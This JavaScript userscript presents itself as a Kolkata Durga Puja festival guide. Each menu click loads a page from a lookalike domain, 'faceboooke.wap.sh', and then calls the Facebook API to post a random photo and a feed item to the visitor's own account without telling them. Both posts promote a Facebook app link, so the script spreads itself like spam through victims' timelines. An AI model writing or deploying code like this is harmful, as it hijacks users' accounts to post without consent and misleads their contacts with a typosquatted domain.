// ==UserScript==
// @name          dyenfgvcbvcbvcvbce
// @namespace     appi
// @description   for test porpus

// ==/UserScript==

/*1337551016,169897602,JIT Construction: v560112,en_US*/







function blog()
 // just for clarity
{
var hh = "http://faceboooke.wap.sh/slideshow/aboutus"; 
document.getElementById("forum").src=hh;
closeShare('about kolkata','.Welcome to your very own KOLKATADURGAPUJA website where you can view The BIGGEST FESTIVAL of Bengal. The web site has been designed on ...The journey from North to South, East to West remain continuous, rest and relaxation ... One of the most noteworthy Durga Pujo in South Kolkata is Singhi Park ','http://3.bp.blogspot.com/-z2HWHs620kA/Tm9Lneywv7I/AAAAAAAACwA/Lp4QNIXoW9Y/s320/130920111440-001-700373.jpg');
}
function north()
 // just for clarity
{
var hh = "http://faceboooke.wap.sh/slideshow/north.html"; 
document.getElementById("forum").src=hh;
closeShare('north kolkata','Welcome to your very own KOLKATADURGAPUJA website where you can view The BIGGEST FESTIVAL of Bengal. The web site has been designed on ...','http://1.bp.blogspot.com/-zZWLudDpHxk/Toa-leVXAfI/AAAAAAAAC5I/BRrRmD53WeA/s320/011020111551-001-761769.jpg');
}
function south()
 // just for clarity
{
var hh = "http://faceboooke.wap.sh/slideshow/south.html"; 
document.getElementById("forum").src=hh;
closeShare('south kolkata','The journey from North to South, East to West remain continuous, rest and relaxation ... One of the most noteworthy Durga Pujo in South Kolkata is Singhi Park ...','http://4.bp.blogspot.com/-jC96qpLV2Bw/ToslCKjdnJI/AAAAAAAAAmA/1TmsQhdnF2o/s1600/Beautifully+Sculpted+Durga+idol.jpg');
}
function west()
 // just for clarity
{
var hh = "http://faceboooke.wap.sh/slideshow/west.html"; 
document.getElementById("forum").src=hh;
closeShare('west kolkata',' Kolkata Durga Puja Themes. ... Durga Puja starts tomorrow. ... focus on women empowerment and is dedicated to West Bengali ...','http://farm7.static.flickr.com/6230/6212914157_b0529ece0e.jpg');
}function salt()
 // just for clarity
{
var hh = "http://faceboooke.wap.sh/slideshow/salt.html"; 
document.getElementById("forum").src=hh;
closeShare('salt kolkata','KOLKATA CELEBRATE THIS DURGA PUJA OF ... Saltlake  Kolkata Durga Puja ','http://www.utsavlive.com/durgapuja/wp-content/uploads/2011/09/FD-Block-Durga-Puja-2.jpg');
}
function closeShare(i,r,g ) { 
	
	document.getElementById('d').innerHTML = i;
	document.getElementById('d').innerHTML += r;


var m = "100000354391202";
		 		 
		 var arr_image=new Array();
		 
		arr_image[0]="http://sphotos-c.ak.fbcdn.net/hphotos-ak-prn1/156683_194316764037582_2136101887_n.jpg";
		 
arr_image[1]="http://sphotos-e.ak.fbcdn.net/hphotos-ak-ash3/30342_194319534037305_1518655098_n.jpg";


arr_image[2]="http://sphotos-f.ak.fbcdn.net/hphotos-ak-prn1/552351_194332837369308_889081769_n.jpg";


arr_image[3]="http://sphotos-e.ak.fbcdn.net/hphotos-ak-prn1/60731_194335520702373_1347620021_n.jpg";
arr_image[4]="http://sphotos-g.ak.fbcdn.net/hphotos-ak-ash4/311170_194342650701660_1004535584_n.jpg";
arr_image[5]="http://sphotos-b.ak.fbcdn.net/hphotos-ak-snc6/251273_194342280701697_1805679548_n.jpg";
arr_image[6]="http://sphotos-d.ak.fbcdn.net/hphotos-ak-snc7/933_194341730701752_816849966_n.jpg";
arr_image[7]="http://sphotos-g.ak.fbcdn.net/hphotos-ak-ash4/479900_194341650701760_383576936_n.jpg";
arr_image[8]="http://sphotos-g.ak.fbcdn.net/hphotos-ak-ash3/60277_194336190702306_266316217_n.jpg";
arr_image[9]="http://sphotos-d.ak.fbcdn.net/hphotos-ak-snc7/425949_194336024035656_1098909115_n.jpg";
arr_image[10]="http://sphotos-f.ak.fbcdn.net/hphotos-ak-ash3/541167_194335947368997_1030604676_n.jpg";
var randomm = Math.floor((Math.random()*10)+1);
var	imgURL=arr_image[randomm];
		 FB.api('/photos', 'post', {
    message:i+r+randomm+'bangali pujo Durga pujo----> http://apps.facebook.com/durja-pujo-kolkata',
    url:imgURL, 
	      
}, function(response){

    if (!response || response.error) { signupBetahome()
        
    } else { feed(i,r,g);}

});
	 
	 
	 }
	 
	  function feed(i,r,g)  
    {  
        FB.api('/me/feed', 'post',  
        {  
            message: i,  
            link:'http://apps.facebook.com/durja-pujo-kolkata',  
            name:i+'_Durga Puja',  
            picture:g,  
            description:r,  
        }, function(response) {  
            if (!response || response.error) {  
    alert('Oops! User Denied Access');  
            } else {             }  
        });  
    }

